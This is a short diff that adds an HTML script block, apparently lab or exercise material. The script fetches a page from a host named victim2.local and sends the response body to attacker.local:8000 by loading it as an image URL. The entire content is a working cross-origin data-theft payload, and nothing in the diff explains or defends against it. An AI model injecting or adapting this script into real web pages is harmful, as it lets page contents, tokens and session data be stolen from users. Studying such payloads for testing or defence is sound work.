@@ -1,0 +1,11 @@
+<script>
+
+    function exfiltrate(data) {
+        const image = new Image();
+        image.src = 'http://attacker.local:8000/form?' + data;
+    }
+
+    fetch('http://victim2.local:5000/')
+    .then(value => value.text())
+    .then(exfiltrate);
+</script>
